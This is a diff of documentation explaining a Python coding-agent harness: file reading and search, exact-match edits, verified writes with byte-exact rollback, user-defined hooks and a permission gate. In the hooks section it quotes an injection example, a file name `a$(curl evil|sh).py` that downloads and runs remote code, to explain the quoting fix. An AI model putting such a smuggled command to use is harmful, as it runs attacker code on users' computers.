+284 |             return f"ERROR: file '{args['path']}' does not exist"
+285 |         size = path.stat().st_size
+286 |         if looks_binary(path):
+287 |             return f"ERROR: '{args['path']}' is a binary file ({size} bytes), not text"
+288 |         start = max(int(args.get("start") or 1), 1)
+289 |         if size > MAX_READ_BYTES:
+290 |             return self._read_part(path, args, start)
+291 |         lines = path.read_text(encoding="utf-8-sig", errors="replace").splitlines()
+292 |         if lines and start > len(lines):
+293 |             return f"(the file has only {len(lines)} lines)"
+294 |         end = min(int(args.get("end") or len(lines)), len(lines))
+295 |         body = "\n".join(f"{n}: {lines[n - 1]}" for n in range(start, end + 1))
+296 |         if body and (start > 1 or end < len(lines)):             # tell the model there is more
+297 |             body += f"\n(lines {start}-{end} of {len(lines)})"
+298 |         return truncate(body, self._cfg.max_output_chars) or "(empty file)"
+299 | 
 ```
-- Resolves and checks the file, reads it as text (undecodable bytes are replaced rather than crashing), clamps
-  `start` (at least 1) and `end` (at most the file length), prefixes each line with its number so the model can quote
-  exact locations, and truncates the result.
+- Resolves and checks the file. A **binary** file (`looks_binary`) is refused with its size — before 0.6 reading a model
+  or image file returned thousands of garbage characters.
+- Files over `MAX_READ_BYTES` go to `_read_part`. Others are read as text (a byte-order mark dropped, undecodable bytes
+  replaced rather than crashing); `start` and `end` may be missing or `null`; a `start` past the end says how long the
+  file is; each line is prefixed with its number so the model can quote exact locations.
+- A read of only part of the file ends with `(lines 20-60 of 340)`, so the model knows there is more without guessing.
+  The result is truncated.
 
 ```python
-247 |     def _search(self, args: dict) -> str:
-248 |         try:
-249 |             pattern = re.compile(args["pattern"])
-250 |         except re.error as exc:
-251 |             return f"ERROR: invalid regular expression: {exc}"
-252 |         folder = resolve_inside(self._root, args.get("path", "."))
-253 |         hits: list[str] = []
-254 |         glob = args.get("glob", "*.py")
-255 |         for scanned, path in enumerate(walk_files(folder), start=1):
-256 |             if scanned > MAX_SEARCH_FILES:
-257 |                 hits.append(f"... stopped after looking at {MAX_SEARCH_FILES} files; "
-258 |                             "narrow 'path' or 'glob'")
-259 |                 break
-260 |             relative = path.relative_to(self._root)
-261 |             if not fnmatch.fnmatch(path.name, glob):
-262 |                 continue
-263 |             try:
-264 |                 lines = path.read_text(encoding="utf-8").splitlines()
-265 |             except UnicodeDecodeError:
-266 |                 continue                              # binary file: skip
-267 |             for number, line in enumerate(lines, start=1):
-268 |                 if pattern.search(line):
-269 |                     hits.append(f"{relative.as_posix()}:{number}: {line.strip()[:120]}")
-270 |                     if len(hits) >= MAX_SEARCH_HITS:
-271 |                         return "\n".join(hits) + f"\n... stopped at {MAX_SEARCH_HITS} matches"
-272 |         return "\n".join(hits) or "no matches"
-273 | 
+300 |     def _read_part(self, path: Path, args: dict, start: int) -> str:
+301 |         """Lines ``start`` to ``end`` of a file too big to load whole (read line by line)."""
+302 |         if not args.get("end"):
+303 |             return (f"ERROR: '{args['path']}' is {path.stat().st_size // 1_000_000} MB, too big to "
+304 |                     "read whole; use search to find the lines you need, then read_file with start "
+305 |                     "and end")
+306 |         end, rows = int(args["end"]), []
+307 |         with path.open(encoding="utf-8-sig", errors="replace") as handle:
+308 |             for number, line in enumerate(handle, start=1):
+309 |                 if number > end:
+310 |                     break
+311 |                 if number >= start:
+312 |                     rows.append(f"{number}: {line.rstrip(chr(13) + chr(10))}")
+313 |         return truncate("\n".join(rows), self._cfg.max_output_chars) or "(no such lines)"
+314 | 
+```
+- Reads a very large file (a log, a data dump) **line by line**, keeping only lines `start` to `end` and stopping after
+  `end`, so it never loads the whole file. Without `end` it asks the model to find the lines with `search` first.
+
+```python
+315 |     def _search(self, args: dict) -> str:
+316 |         try:
+317 |             pattern = re.compile(args["pattern"])
+318 |         except re.error as exc:
+319 |             return f"ERROR: invalid regular expression: {exc}"
+320 |         target = resolve_inside(self._root, args.get("path") or ".")
+321 |         files = [target] if target.is_file() else project_files(target)
+322 |         globs = _globs(args.get("glob") or "*")
+323 |         hits: list[str] = []
+324 |         for scanned, path in enumerate(files, start=1):
+325 |             if scanned > MAX_SEARCH_FILES:
+326 |                 hits.append(f"... stopped after looking at {MAX_SEARCH_FILES} files; "
+327 |                             "narrow 'path' or 'glob'")
+328 |                 break
+329 |             relative = path.relative_to(self._root).as_posix()
+330 |             if not any(fnmatch.fnmatch(path.name, g) or fnmatch.fnmatch(relative, g) for g in globs):
+331 |                 continue
+332 |             try:
+333 |                 if path.stat().st_size > MAX_SEARCH_BYTES or looks_binary(path):
+334 |                     continue                          # data, bundles, models: not code to grep
+335 |                 lines = path.read_text(encoding="utf-8").splitlines()
+336 |             except (UnicodeDecodeError, OSError):
+337 |                 continue                              # another encoding, or gone: skip
+338 |             for number, line in enumerate(lines, start=1):
+339 |                 if pattern.search(line):
+340 |                     hits.append(f"{relative}:{number}: {line.strip()[:120]}")
+341 |                     if len(hits) >= MAX_SEARCH_HITS:
+342 |                         return "\n".join(hits) + f"\n... stopped at {MAX_SEARCH_HITS} matches"
+343 |         return "\n".join(hits) or "no matches"
+344 | 
 ```
 - Compiles the regular expression; an invalid one returns a readable error instead of crashing.
-- Walks the chosen folder with `walk_files` (stopping after `MAX_SEARCH_FILES` files with a note) and keeps files whose
-  *name* matches `glob` (default `*.py`, e.g.
-  `*.js` for JavaScript).
-- Binary files raise `UnicodeDecodeError` and are skipped. Each matching line is reported as `path:line: text`
-  (stripped and cut to 120 characters). After 40 hits it stops and says so; no hits returns "no matches".
+- Searches the chosen folder with `project_files` (so `.gitignore`d files are skipped) — or just that file, when
+  `path` names a file — stopping after `MAX_SEARCH_FILES` files with a note.
+- **The default is now every text file** (`*`). Before 0.6 it was `*.py`, so in a JavaScript, Go or Rust project a search
+  without a `glob` found nothing at all, and the model concluded the code did not exist. A `glob` is matched against the
+  file name *and* the workspace path, so `src/*.ts` works, and braces work (`*.{js,ts}`, via `_globs`).
+- Files over `MAX_SEARCH_BYTES`, binary files and files in other encodings are skipped. Each matching line is reported
+  as `path:line: text` (stripped and cut to 120 characters). After 40 hits it stops and says so; no hits returns
+  "no matches".
 
 ```python
-274 |     def _outline(self, args: dict) -> str:
-275 |         target = resolve_inside(self._root, args.get("path", "."))
-276 |         if target.is_file():
-277 |             files = [target]
-278 |         elif target.is_dir():
-279 |             files = [p for p in walk_files(target) if p.suffix == ".py"]
-280 |         else:
-281 |             return f"ERROR: '{args.get('path', '.')}' does not exist"
-282 |         rows: list[str] = []
-283 |         for path in files:
-284 |             rows.append(path.relative_to(self._root).as_posix() + ":")
-285 |             try:
-286 |                 tree = ast.parse(path.read_text(encoding="utf-8"))
-287 |             except (SyntaxError, UnicodeDecodeError):
-288 |                 rows.append("  (cannot parse)")
-289 |                 continue
-290 |             for node in tree.body:
-291 |                 if isinstance(node, ast.ClassDef):
-292 |                     rows.append(f"  class {node.name}  line {node.lineno}")
-293 |                     rows += [f"    def {m.name}  line {m.lineno}" for m in node.body
-294 |                              if isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef))]
-295 |                 elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
-296 |                     rows.append(f"  def {node.name}  line {node.lineno}")
-297 |         return truncate("\n".join(rows), self._cfg.max_output_chars) or "(no Python files)"
-298 | 
+345 |     def _outline(self, args: dict) -> str:
+346 |         target = resolve_inside(self._root, args.get("path") or ".")
+347 |         if target.is_file():
+348 |             files = [target]
+349 |         elif target.is_dir():
+350 |             files = [p for p in project_files(target) if p.suffix == ".py"]
+351 |         else:
+352 |             return f"ERROR: '{args.get('path', '.')}' does not exist"
+353 |         rows: list[str] = []
+354 |         for path in files:
+355 |             rows.append(path.relative_to(self._root).as_posix() + ":")
+356 |             try:
+357 |                 tree = ast.parse(path.read_text(encoding="utf-8-sig"))
+358 |             except (SyntaxError, UnicodeDecodeError, ValueError):
+359 |                 rows.append("  (cannot parse)")
+360 |                 continue
+361 |             for node in tree.body:
+362 |                 if isinstance(node, ast.ClassDef):
+363 |                     rows.append(f"  class {node.name}  line {node.lineno}")
+364 |                     rows += [f"    def {m.name}  line {m.lineno}" for m in node.body
+365 |                              if isinstance(m, (ast.FunctionDef, ast.AsyncFunctionDef))]
+366 |                 elif isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+367 |                     rows.append(f"  def {node.name}  line {node.lineno}")
+368 |         return truncate("\n".join(rows), self._cfg.max_output_chars) or "(no Python files)"
+369 | 
 ```
 - A *repo-map* tool for big projects: instead of reading whole files the model asks for the shape of the code.
-  For a file or for every `.py` file under a folder (found with `walk_files`) it parses the source with `ast` and lists top-level classes (with
-  their methods) and functions, each with its line number, so a following `read_file` can target just those lines.
-  Unparseable files show `(cannot parse)` (the write gate normally prevents them), and the result is truncated.
+  For a file or for every `.py` file under a folder (found with `project_files`) it parses the source with `ast` and
+  lists top-level classes (with their methods) and functions, each with its line number, so a following `read_file` can
+  target just those lines. Unparseable files show `(cannot parse)` (the write gate normally prevents them), and the
+  result is truncated.
 
 ```python
-299 |     def _todo(self, args: dict) -> str:
-300 |         items = args["items"]
-301 |         if not isinstance(items, list) or not items:
-302 |             return "ERROR: 'items' must be a non-empty list of {text, done}"
-303 |         self.todo = [_todo_item(i) for i in items]
-304 |         finished = sum(item["done"] for item in self.todo)
-305 |         lines = [f"TODO {finished}/{len(self.todo)} done"]
-306 |         lines += [f"  [{'x' if item['done'] else ' '}] {item['text']}" for item in self.todo]
-307 |         return "\n".join(lines)
-308 | 
-309 |     # ----- write tools (verified, rolled back on failure) -------------------
+370 |     def _todo(self, args: dict) -> str:
+371 |         items = args["items"]
+372 |         if not isinstance(items, list) or not items:
+373 |             return "ERROR: 'items' must be a non-empty list of {text, done}"
+374 |         self.todo = [_todo_item(i) for i in items]
+375 |         finished = sum(item["done"] for item in self.todo)
+376 |         lines = [f"TODO {finished}/{len(self.todo)} done"]
+377 |         lines += [f"  [{'x' if item['done'] else ' '}] {item['text']}" for item in self.todo]
+378 |         return "\n".join(lines)
+379 | 
+380 |     # ----- write tools (verified, rolled back on failure) -------------------
 ```
 - Like Claude Code's to-do list: the model sends its whole plan as a list (each item `{text, done}` or plain text,
   normalised by `_todo_item`); the tool stores it and returns `TODO 1/3 done` plus one `[x]`/`[ ]` line per item, which the agent shows in full. It
@@ -469,64 +589,80 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
 
 ## Write tools and the write gate
 ```python
-310 |     def _write_file(self, args: dict) -> str:
-311 |         return self._commit(args["path"], args["content"])
-312 | 
+381 |     def _write_file(self, args: dict) -> str:
+382 |         return self._commit(args["path"], str(args["content"]))
+383 | 
 ```
 - Simply forwards to `_commit`.
 
 ```python
-313 |     def _edit_file(self, args: dict) -> str:
-314 |         path = resolve_inside(self._root, args["path"])
-315 |         if not path.is_file():
-316 |             return f"ERROR: file '{args['path']}' does not exist"
-317 |         text = path.read_text(encoding="utf-8")
-318 |         count = text.count(args["old"])
-319 |         if args.get("all") is True and count >= 1:
-320 |             return self._commit(args["path"], text.replace(args["old"], args["new"]))
-321 |         if count != 1:
-322 |             return (f"ERROR: 'old' text must match exactly once, but matched {count} times"
-323 |                     + (" (use all=true to replace every occurrence)" if count > 1 else ""))
-324 |         return self._commit(args["path"], text.replace(args["old"], args["new"]))
-325 | 
+384 |     def _edit_file(self, args: dict) -> str:
+385 |         path = resolve_inside(self._root, args["path"])
+386 |         if not path.is_file():
+387 |             return f"ERROR: file '{args['path']}' does not exist"
+388 |         old, new = str(args["old"]).replace("\r\n", "\n"), str(args["new"]).replace("\r\n", "\n")
+389 |         if not old:
+390 |             return EMPTY_OLD
+391 |         text, style = read_text(path)
+392 |         if old.startswith("﻿") and style[1]:      # the edit names the byte-order mark itself:
+393 |             text, style = "﻿" + text, (style[0], False)   # it is text now, and may go
+394 |         count = text.count(old)
+395 |         if args.get("all") is True and count >= 1:
+396 |             return self._commit(args["path"], text.replace(old, new), style)
+397 |         if count != 1:
+398 |             return (f"ERROR: 'old' text must match exactly once, but matched {count} times"
+399 |                     + (" (use all=true to replace every occurrence)" if count > 1 else ""))
+400 |         return self._commit(args["path"], text.replace(old, new), style)
+401 | 
 ```
-- Requires the file to exist, counts occurrences of `old`, and refuses unless there is **exactly one** (zero = nothing
-  to replace, several = ambiguous; the error then hints at `all=true`). The replacement goes through the same verified
-  `_commit`.
+- Requires the file to exist. `old` and `new` get plain `\n` line breaks, like the text they are matched against.
+- **An empty `old` is refused.** Every text "contains" the empty string once between every two characters: with
+  `all=true`, `"abc".replace("", "X")` gives `"XaXbXcX"`. Before 0.6 such a call was *accepted* for unchecked files
+  (Markdown, HTML, CSS ...) and wrote exactly that.
+- Reads the file with `read_text` (remembering its style), counts occurrences of `old`, and refuses unless there is
+  **exactly one** (zero = nothing to replace, several = ambiguous; the error then hints at `all=true`). The replacement
+  goes through the same verified `_commit`, in the file's own style.
+- The byte-order mark is normally invisible to edits and always kept. Only when `old` itself starts with the mark
+  (`﻿`) — the model deliberately editing it — does the mark become part of the text, so that `new` decides whether
+  it stays. Without this a model could never remove one: the style would put it back after every write.
 - **`all=true` (rename mode):** with this opt-in flag every occurrence is replaced (at least one must exist). It was added
   after the `rename_function` eval: the model had to rename a name used twice in `main.py`, the unique-match rule
   blocked it and it got stuck. The unique-match rule stays the default because it prevents accidental mass edits; the
   verification gate still checks the result (e.g. renaming `f` everywhere would break `from` and be rejected).
 
 ```python
-326 |     def _multi_edit(self, args: dict) -> str:
-327 |         path = resolve_inside(self._root, args["path"])
-328 |         if not path.is_file():
-329 |             return f"ERROR: file '{args['path']}' does not exist"
-330 |         text = path.read_text(encoding="utf-8")
-331 |         edits = args["edits"]
-332 |         if not isinstance(edits, list) or not edits:
-333 |             return "ERROR: 'edits' must be a non-empty list of {old, new}"
-334 |         for number, edit in enumerate(edits, start=1):
-335 |             count = text.count(edit["old"])
-336 |             if count != 1:
-337 |                 return (f"ERROR: edit {number}: 'old' text must match exactly once, "
-338 |                         f"but matched {count} times. Nothing was changed.")
-339 |             text = text.replace(edit["old"], edit["new"])
-340 |         return self._commit(args["path"], text)
-341 | 
+402 |     def _multi_edit(self, args: dict) -> str:
+403 |         path = resolve_inside(self._root, args["path"])
+404 |         if not path.is_file():
+405 |             return f"ERROR: file '{args['path']}' does not exist"
+406 |         edits = args["edits"]
+407 |         if not isinstance(edits, list) or not edits:
+408 |             return "ERROR: 'edits' must be a non-empty list of {old, new}"
+409 |         text, style = read_text(path)
+410 |         for number, edit in enumerate(edits, start=1):
+411 |             old = str(edit["old"]).replace("\r\n", "\n")
+412 |             if not old:
+413 |                 return f"{EMPTY_OLD}. Edit {number} is empty; nothing was changed."
+414 |             count = text.count(old)
+415 |             if count != 1:
+416 |                 return (f"ERROR: edit {number}: 'old' text must match exactly once, "
+417 |                         f"but matched {count} times. Nothing was changed.")
+418 |             text = text.replace(old, str(edit["new"]).replace("\r\n", "\n"))
+419 |         return self._commit(args["path"], text, style)
+420 | 
 ```
 - Several edits to one file in **one model call and one verification** (fewer calls than repeated `edit_file`).
-  Edits are applied in order to an in-memory copy; every `old` must match exactly once at its turn. On the first problem
-  it returns an error naming the edit number and *nothing is written* (all-or-nothing). Success goes through `_commit`,
-  so the usual verify/rollback gate applies to the combined result. An empty or non-list `edits` is rejected.
+  Edits are applied in order to an in-memory copy; every `old` must be non-empty and match exactly once at its turn. On
+  the first problem it returns an error naming the edit number and *nothing is written* (all-or-nothing). Success goes
+  through `_commit` in the file's own style, so the usual verify/rollback gate applies to the combined result. An empty
+  or non-list `edits` is rejected.
 
 ```python
-342 |     def _format(self, path: Path) -> None:
-343 |         """Best-effort ``ruff format`` of a file that already passed verification."""
-344 |         if self._cfg.auto_format and _installed("ruff"):
-345 |             run_command([sys.executable, "-m", "ruff", "format", str(path)], self._root, 30, 500)
-346 | 
+421 |     def _format(self, path: Path) -> None:
+422 |         """Best-effort ``ruff format`` of a file that already passed verification."""
+423 |         if self._cfg.auto_format and _installed("ruff"):
+424 |             run_command([sys.executable, "-m", "ruff", "format", str(path)], self._root, 30, 500)
+425 | 
 ```
 - Best-effort auto-format: if `auto_format` is on and ruff is installed, runs `ruff format <file>` in the workspace
   (30 s limit). It runs only **after** verification passed, so a format problem can never reject good code, and its
@@ -534,70 +670,86 @@ agent (a second, independent check). The CLI also calls `check_workspace` after 
   model should re-read before an exact-match `edit_file` if it is unsure.
 
 ```python
-347 |     def _commit(self, relative: str, text: str) -> str:
-348 |         """Write ``text``; verify checkable files and roll back on failure."""
-349 |         path = resolve_inside(self._root, relative)
-350 |         key = path.relative_to(self._root).as_posix()
-351 |         previous = path.read_text(encoding="utf-8") if path.exists() else None
-352 |         path.parent.mkdir(parents=True, exist_ok=True)
-353 |         path.write_text(text, encoding="utf-8")
-354 |         if path.suffix.lower() not in CHECKED_SUFFIXES:
-355 |             self.writes += 1
-356 |             self._remember_diff(key, previous, path)
-357 |             return f"OK: wrote {key} ({len(text.splitlines())} lines)" + self._after_edit(key)
-358 |         report = verify_file(path, self._root, self._cfg.type_check)
-359 |         if report.ok:
-360 |             self._failures.pop(key, None)
-361 |             self.writes += 1
-362 |             if path.suffix == ".py":
-363 |                 self._format(path)
-364 |             self._remember_diff(key, previous, path)
-365 |             return (f"OK: wrote {key} ({len(text.splitlines())} lines); verification passed"
-366 |                     + self._after_edit(key))
-367 |         if previous is None:                      # roll back: undo the bad write
-368 |             path.unlink()
-369 |         else:
-370 |             path.write_text(previous, encoding="utf-8")
-371 |         count = self._failures.get(key, 0) + 1
-372 |         self._failures[key] = count
-373 |         if count >= self._cfg.max_fix_attempts:
-374 |             return (f"REJECTED ({count}/{self._cfg.max_fix_attempts}): {key} NOT written.\n"
-375 |                     f"{report.render()}\nSTOP: attempts exhausted. Explain the problem to "
-376 |                     "the user instead of retrying.")
-377 |         hint = f"\n{TOGETHER_HINT}" if "F821" in report.render() else ""   # F821 = undefined name
-378 |         return (f"REJECTED ({count}/{self._cfg.max_fix_attempts}): {key} NOT written. "
-379 |                 f"Fix these errors and call write_file again:\n{report.render()}{hint}")
-380 | 
+426 |     @staticmethod
+427 |     def _style_of(path: Path, previous: bytes | None) -> TextStyle:
+428 |         """The style to write in: the file's own, else LF (CRLF for batch files)."""
+429 |         if previous is not None:
+430 |             try:
+431 |                 return text_style(previous.decode("utf-8"))
+432 |             except UnicodeDecodeError:
+433 |                 pass
+434 |         return ("\r\n" if path.suffix.lower() in CRLF_SUFFIXES else "\n"), False
+435 | 
+```
+- The style for a write that did not come from an edit (`write_file`): an existing file keeps its own; a new file gets
+  LF — or CRLF for `.bat`/`.cmd` — and no mark.
+
+```python
+436 |     def _commit(self, relative: str, text: str, style: TextStyle | None = None) -> str:
+437 |         """Write ``text``; verify checkable files and roll back on failure."""
+438 |         path = resolve_inside(self._root, relative)
+439 |         key = path.relative_to(self._root).as_posix()
+440 |         previous = path.read_bytes() if path.is_file() else None   # exact bytes, for rollback
+441 |         path.parent.mkdir(parents=True, exist_ok=True)
+442 |         write_text(path, text, style or self._style_of(path, previous))
+443 |         if path.suffix.lower() not in CHECKED_SUFFIXES:
+444 |             self.writes += 1
+445 |             self._remember_diff(key, previous, path)
+446 |             return f"OK: wrote {key} ({len(text.splitlines())} lines)" + self._after_edit(key)
+447 |         report = verify_file(path, self._root, self._cfg.type_check)
+448 |         if report.ok:
+449 |             self._failures.pop(key, None)
+450 |             self.writes += 1
+451 |             if path.suffix == ".py":
+452 |                 self._format(path)
+453 |             self._remember_diff(key, previous, path)
+454 |             return (f"OK: wrote {key} ({len(text.splitlines())} lines); verification passed"
+455 |                     + self._after_edit(key))
+456 |         if previous is None:                      # roll back: undo the bad write
+457 |             path.unlink()
+458 |         else:
+459 |             path.write_bytes(previous)            # byte for byte, as it was
+460 |         count = self._failures.get(key, 0) + 1
+461 |         self._failures[key] = count
+462 |         if count >= self._cfg.max_fix_attempts:
+463 |             return (f"REJECTED ({count}/{self._cfg.max_fix_attempts}): {key} NOT written.\n"
+464 |                     f"{report.render()}\nSTOP: attempts exhausted. Explain the problem to "
+465 |                     "the user instead of retrying.")
+466 |         hint = f"\n{TOGETHER_HINT}" if "F821" in report.render() else ""   # F821 = undefined name
+467 |         return (f"REJECTED ({count}/{self._cfg.max_fix_attempts}): {key} NOT written. "
+468 |                 f"Fix these errors and call write_file again:\n{report.render()}{hint}")
+469 | 
 ```
 - Resolves the path safely and computes `key`, the workspace-relative name used to count failures per file.
-- Remembers the previous content (`None` for a new file) so the write can be undone, creates parent folders, writes.
+- Remembers the previous content **as bytes** (`None` for a new file) so the write can be undone exactly, creates
+  parent folders, and writes in the given style (or `_style_of`).
 - Files with no check (not in `CHECKED_SUFFIXES`) are just written. Checkable files (Python, JSON, TOML, YAML and the
   languages in `verify.py`'s `CHECKERS`) go through `verify_file` on the file on disk.
 - **Pass:** clear this file's failure counter, count the write, run `_format` (Python only), remember the diff for
   your screen (`_remember_diff`), run the `after_edit` hook, and report success. Non-checkable files also get a diff
   and the hook. Non-Python files are
   just written and counted.
-- **Fail (rollback):** delete a brand-new file, or restore an overwritten file's previous content. Increment the
-  counter. An undefined-name error gets `TOGETHER_HINT`. When the counter reaches `max_fix_attempts` the message ends
+- **Fail (rollback):** delete a brand-new file, or write back an overwritten file's previous bytes unchanged. Increment
+  the counter. An undefined-name error gets `TOGETHER_HINT`. When the counter reaches `max_fix_attempts` the message ends
   with `STOP`, steering the model to explain the problem
   instead of looping; otherwise it returns the exact errors and asks for a fix.
 
 ```python
-381 |     def _remember_diff(self, key: str, previous: str | None, path: Path) -> None:
-382 |         """Keep a unified diff of the change so the user can see what was edited."""
-383 |         try:
-384 |             now = path.read_text(encoding="utf-8").splitlines()
-385 |         except (OSError, UnicodeDecodeError):
-386 |             now = []
-387 |         before = previous.splitlines() if previous is not None else []
-388 |         diff = list(difflib.unified_diff(before, now, f"a/{key}", f"b/{key}", n=1, lineterm=""))
-389 |         self._diff = diff[2:]                     # drop the ---/+++ header: the file is named already
-390 | 
-391 |     # ----- hooks: your own commands, run automatically ----------------------
+470 |     def _remember_diff(self, key: str, previous: bytes | None, path: Path) -> None:
+471 |         """Keep a unified diff of the change so the user can see what was edited."""
+472 |         try:
+473 |             now = path.read_text(encoding="utf-8-sig").splitlines()
+474 |         except (OSError, UnicodeDecodeError):
+475 |             now = []
+476 |         before = previous.decode("utf-8-sig", "replace").splitlines() if previous is not None else []
+477 |         diff = list(difflib.unified_diff(before, now, f"a/{key}", f"b/{key}", n=1, lineterm=""))
+478 |         self._diff = diff[2:]                     # drop the ---/+++ header: the file is named already
+479 | 
+480 |     # ----- hooks: your own commands, run automatically ----------------------
 ```
-- Compares the file before (empty for a new file) and after (re-read from disk, so formatting is included) with
-  `difflib.unified_diff`, one line of context, and drops the two `---`/`+++` header lines (the result line already names
-  the file).
+- Compares the file before (decoded from the saved bytes; empty for a new file) and after (re-read from disk, so
+  formatting is included) with `difflib.unified_diff`, one line of context, and drops the two `---`/`+++` header lines
+  (the result line already names the file).
 
 ## Hooks — your own commands, run automatically
 Like Claude Code's hooks. In `settings.json`:
@@ -605,31 +757,36 @@ Like Claude Code's hooks. In `settings.json`:
 {"hooks": {"after_edit": "ruff check {file}", "after_request": "python -m pytest -q"}}
 ```
 ```python
-392 |     def run_hook(self, name: str, file: str = "") -> tuple[int, str] | None:
-393 |         """Run the hook ``name`` from the settings (``{file}`` = the changed file); None if unset.
-394 | 
-395 |         Hooks are commands YOU wrote in settings.json, so they run without a question, on this
-396 |         computer, in the project folder, with the normal time limit.
-397 |         """
-398 |         command = self.hooks.get(name)
-399 |         if not command:
-400 |             return None
-401 |         argv = shell_argv(str(command).replace("{file}", file))
-402 |         return run_command(argv, self._root, self._cfg.command_timeout, self._cfg.max_output_chars)
-403 | 
+481 |     def run_hook(self, name: str, file: str = "") -> tuple[int, str] | None:
+482 |         """Run the hook ``name`` from the settings (``{file}`` = the changed file); None if unset.
+483 | 
+484 |         Hooks are commands YOU wrote in settings.json, so they run without a question, on this
+485 |         computer, in the project folder, with the normal time limit. The file name is chosen
+486 |         by the model, so it is quoted: a name can never smuggle in a command of its own.
+487 |         """
+488 |         command = self.hooks.get(name)
+489 |         if not command:
+490 |             return None
+491 |         argv = shell_argv(str(command).replace("{file}", quote_for_shell(file) if file else ""))
+492 |         return run_command(argv, self._root, self._cfg.command_timeout, self._cfg.max_output_chars)
+493 | 
 ```
-- Runs the named hook if it is set (`{file}` becomes the changed file), through `shell_argv` (PowerShell on Windows, `sh` elsewhere),
-  in the project folder, with the normal time limit and output cap. No question is asked: you wrote the command.
+- Runs the named hook if it is set, through `shell_argv` (PowerShell on Windows, `sh` elsewhere), in the project folder,
+  with the normal time limit and output cap. No question is asked: you wrote the command.
+- `{file}` becomes the changed file's name **quoted by `quote_for_shell`**: the model chooses file names, and before 0.6
+  a name like `a$(curl evil|sh).py` ran its hidden command on your computer through this very line (see `sandbox.md`).
+  Ordinary names are inserted as they are, so existing hooks behave as before; do not put your own quotes around
+  `{file}`.
 
 ```python
-404 |     def _after_edit(self, key: str) -> str:
-405 |         """Run the after_edit hook; a failure is added to the result so the model fixes it."""
-406 |         outcome = self.run_hook("after_edit", key)
-407 |         if outcome is None or outcome[0] == 0:
-408 |             return ""
-409 |         return f"\nHOOK after_edit failed (exit code {outcome[0]}):\n{outcome[1].strip()}"
-410 | 
-411 |     # ----- permission gate for everything that runs or reaches out ---------
+494 |     def _after_edit(self, key: str) -> str:
+495 |         """Run the after_edit hook; a failure is added to the result so the model fixes it."""
+496 |         outcome = self.run_hook("after_edit", key)
+497 |         if outcome is None or outcome[0] == 0:
+498 |             return ""
+499 |         return f"\nHOOK after_edit failed (exit code {outcome[0]}):\n{outcome[1].strip()}"
+500 | 
+501 |     # ----- permission gate for everything that runs or reaches out ---------
 ```
 - Runs `after_edit` after every successful write. A failing hook (exit code not 0) adds its output to the write's
   result — so the model reads, say, the linter's complaint and fixes it, the way Claude Code's PostToolUse hooks feed
@@ -637,16 +794,16 @@ Like Claude Code's hooks. In `settings.json`:
 
 ## The permission gate
 ```python
-412 |     def _permitted(self, tool: str, subject: str, question: str) -> str | None:
-413 |         """None when the action may go ahead; otherwise the refusal text for the model."""
-414 |         decision = self.permissions.decide(tool, subject)
-415 |         if decision == "deny":
-416 |             return f"DENIED by a deny rule in the settings: {tool}({subject})"
-417 |         if decision == "allow" or self._approve(Approval(question, tool, subject)):
-418 |             return None
-419 |         return "DENIED: the user did not approve this."
-420 | 
-421 |     # ----- execution tools (verified again, then user-approved) -------------
+502 |     def _permitted(self, tool: str, subject: str, question: str) -> str | None:
+503 |         """None when the action may go ahead; otherwise the refusal text for the model."""
+504 |         decision = self.permissions.decide(tool, subject)
+505 |         if decision == "deny":
+506 |             return f"DENIED by a deny rule in the settings: {tool}({subject})"
+507 |         if decision == "allow" or self._approve(Approval(question, tool, subject)):
+508 |             return None
+509 |         return "DENIED: the user did not approve this."
+510 | 
+511 |     # ----- execution tools (verified again, then user-approved) -------------
 ```
 - Every action that runs code or reaches outside goes through here with its tool name, its subject (file, command,
   URL, MCP arguments) and the question text. A deny rule refuses without asking; an allow rule lets it run without
@@ -655,55 +812,58 @@ Like Claude Code's hooks. In `settings.json`:
 
 ## Execution tools and the run gate
 ```python
-422 |     def _run_python(self, args: dict) -> str:
-423 |         path = resolve_inside(self._root, args["path"])
-424 |         if not path.is_file():
-425 |             return f"ERROR: file '{args['path']}' does not exist"
-426 |         report = verify_python(path, self._root, self._cfg.type_check)
-427 |         if not report.ok:
-428 |             return f"NOT RUN: verification failed:\n{report.render()}"
-429 |         extra = [str(a) for a in args.get("args", [])]
-430 |         relative = path.relative_to(self._root).as_posix()
-431 |         denied = self._permitted("run_python", relative, f"run python {relative} {' '.join(extra)}")
-432 |         if denied:
-433 |             return denied
-434 |         code, output = self.runner.run("python", [relative, *extra])
-435 |         return f"exit code {code}\n{output}"
-436 | 
+512 |     def _run_python(self, args: dict) -> str:
+513 |         path = resolve_inside(self._root, args["path"])
+514 |         if not path.is_file():
+515 |             return f"ERROR: file '{args['path']}' does not exist"
+516 |         report = verify_python(path, self._root, self._cfg.type_check)
+517 |         if not report.ok:
+518 |             return f"NOT RUN: verification failed:\n{report.render()}"
+519 |         extra = [str(a) for a in args.get("args") or []]
+520 |         relative = path.relative_to(self._root).as_posix()
+521 |         denied = self._permitted("run_python", relative, f"run python {relative} {' '.join(extra)}")
+522 |         if denied:
+523 |             return denied
+524 |         code, output = self.runner.run("python", [relative, *extra])
+525 |         return f"exit code {code}\n{output}"
+526 | 
 ```
 - Resolves the path, requires the file, **verifies again** (failure → `NOT RUN` plus errors), then passes the permission
   gate with subject = the file's workspace path (verification comes first so you are never asked about code that cannot
-  run). It runs with the current Python
+  run). It runs with the project's Python (see `runners.md`)
   through the runner (on this computer or in the container), using the path relative to the workspace so it is the
   same in both places, and returns the exit code and output.
 
 ```python
-437 |     def _run_tests(self, args: dict) -> str:
-438 |         problems = self.check_workspace(since=self.started)   # files changed this session
-439 |         if problems:
-440 |             return "NOT RUN: verification failed:\n" + "\n".join(problems)
-441 |         denied = self._permitted("run_tests", "", "run the tests (unittest discovery)")
-442 |         if denied:
-443 |             return denied
-444 |         code, output = self.runner.run("tests", [])
-445 |         return f"exit code {code}\n{output}"
-446 | 
+527 |     def _run_tests(self, args: dict) -> str:
+528 |         problems = self.check_workspace(since=self.started)   # files changed this session
+529 |         if problems:
+530 |             return "NOT RUN: verification failed:\n" + "\n".join(problems)
+531 |         shown = f" ({self.test_command})" if self.test_command else ""
+532 |         denied = self._permitted("run_tests", "", f"run the tests{shown}")
+533 |         if denied:
+534 |             return denied
+535 |         code, output = self.runner.run("tests", [self.test_command] if self.test_command else [])
+536 |         return f"exit code {code}\n{output}"
+537 | 
 ```
